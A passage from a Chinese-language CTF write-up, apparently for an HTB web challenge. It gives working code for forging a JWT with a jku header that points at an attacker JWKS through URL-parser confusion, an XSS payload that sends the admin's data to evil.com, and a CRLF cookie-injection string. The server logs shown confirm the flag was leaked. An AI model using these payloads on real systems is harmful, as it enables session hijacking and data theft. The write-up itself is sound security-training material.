  "n": "snGVLFibex5kTeuKOO-XGt3Nstoy1b0WWA8jrUGPvsS5Ep_5emF0QP84TV0-2Z0_heMC55jICUwpgJWrNwNgL71rFaP2VisiDC0DzVOb-wrSSLhz2W2IyXbssGYBFET9fBm1suWrxWkU8ZDHKsXzBtG5SnTsFWjFXOQTUOP70SIU71exBBeGnZJkhwM0zXa2ny-fEGo9yONrXXRvRw-axym_ZCOLbirwrrSkY8S-YCrXCCVl9j9RhfpCXmoMqp-hkODmkqtmm82JuIHSbpigEoyledn4UOGpvHy5JRzAV_TlwDK-U0B2JfpTDkD8SRfX-WPWdVS3rknWu-4eOtmG8Q"
}
```

将其中的 `n`、`e` 转换成十进制：

```python
import json, base64

e = "AQAB"
n= "snGVLFibex5kTeuKOO-XGt3Nstoy1b0WWA8jrUGPvsS5Ep_5emF0QP84TV0-2Z0_heMC55jICUwpgJWrNwNgL71rFaP2VisiDC0DzVOb-wrSSLhz2W2IyXbssGYBFET9fBm1suWrxWkU8ZDHKsXzBtG5SnTsFWjFXOQTUOP70SIU71exBBeGnZJkhwM0zXa2ny-fEGo9yONrXXRvRw-axym_ZCOLbirwrrSkY8S-YCrXCCVl9j9RhfpCXmoMqp-hkODmkqtmm82JuIHSbpigEoyledn4UOGpvHy5JRzAV_TlwDK-U0B2JfpTDkD8SRfX-WPWdVS3rknWu-4eOtmG8Q"

def b64url_uint_to_int(seg):
	seg += '=' * (-len(seg) % 4)
	raw = base64.urlsafe_b64decode(seg)
	return int.from_bytes(raw, 'big')

print(b64url_uint_to_int(e))
print(b64url_uint_to_int(n))
```

运行：

```bash
$ python b642int.py
65537
22526428004743745041687983934231841513269901630323288429902766577996138919211729397318956220154477712829843094302924607946329007656137487676774317141058181466989560017276907699539578017323460899436092661513280442262700392160122131599842846292750652923336846402023871797137023655742565368687949040368117859650280584891136735210922409079451300371145842243279595433132802584228967713055213098793097224194812993793003964613124173928157419780487794770033463488268159396968738305184511280606459135204914309076614478079912382528504111087400019248219515910138008947026370601567055228630184183427067890935691464586612870579953
```

创建文件，按照 JWKS 的格式写入公钥信息：

```json
{
  "keys": [
    {
      "alg": "RS256",
      "e": "65537",
      "kid": "4cf0c350-9373-4528-bf6c-1a485727e9d8",
      "kty": "RSA",
      "n": "22526428004743745041687983934231841513269901630323288429902766577996138919211729397318956220154477712829843094302924607946329007656137487676774317141058181466989560017276907699539578017323460899436092661513280442262700392160122131599842846292750652923336846402023871797137023655742565368687949040368117859650280584891136735210922409079451300371145842243279595433132802584228967713055213098793097224194812993793003964613124173928157419780487794770033463488268159396968738305184511280606459135204914309076614478079912382528504111087400019248219515910138008947026370601567055228630184183427067890935691464586612870579953",
      "use": "sig"
    }
  ]
}
```

> 注意 `kid` 保持原样。

构造恶意 JWT：

```python
import jwt
import datetime

private_key = open("private.pem").read()

token_payload = "foo; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *;"

header = {
  "typ": "JWT",
  "alg": "RS256",
  "jku": "https://foo@localhost@evil.com/.well-known/jwks.json",
  "kid": "4cf0c350-9373-4528-bf6c-1a485727e9d8"
}

payload = {
  "username": "admin",
  "token": token_payload,
  "iat": datetime.datetime.utcnow(),
  "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=6)
}

token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers=header
)

print(token)
```

> 为了避免暴露域名，上面进行了脱敏处理，用 `evil.com` 代替我的域名

运行之后，就可以得到恶意的 JWT 了。

### 2、提取 Flag

构造恶意 JS：

```js
<img src=x onerror="fetch('/api/list').then(r=>r.json()).then(d=>{let f=d.submissions.find(s=>s.user==='admin').idea;fetch('https://evil.com/?leak='+encodeURIComponent(f))})"><meta http-equiv="refresh" content="3;URL=/list/foo%0D%0ASet-Cookie%3A%20auth%3d<你的恶意 JWT>%3Bpath%3D%2Flist%0d%0a">
```

> 将之前得到的恶意 JWT 填入上方 `<你的恶意 JWT>` 中即可。

这里做的事情：

- 通过 CRLF 注入替换 bot 的 Cookie 为准备好的恶意 JWT
- 让 bot 访问 `/api/list` 中的 FLag，并将结果作为一个请求外带出来

将上述恶意 JS 代码作为 idea 提交。

过会儿，就可以在服务器上看到两条日志信息：

```
127.0.0.1 - - [20/Jun/2026 12:30:34] "GET /.well-known/jwks.json HTTP/1.1" 200 -
127.0.0.1 - - [20/Jun/2026 12:30:35] "GET /?leak=HTB%7B*************%7D HTTP/1.1" 200 -
```

第一条是服务器拉取公钥来验证 JWT 的合法性的，第二条就是外带出来的 Flag（`*` 是为了避免直接暴露 Flag）。
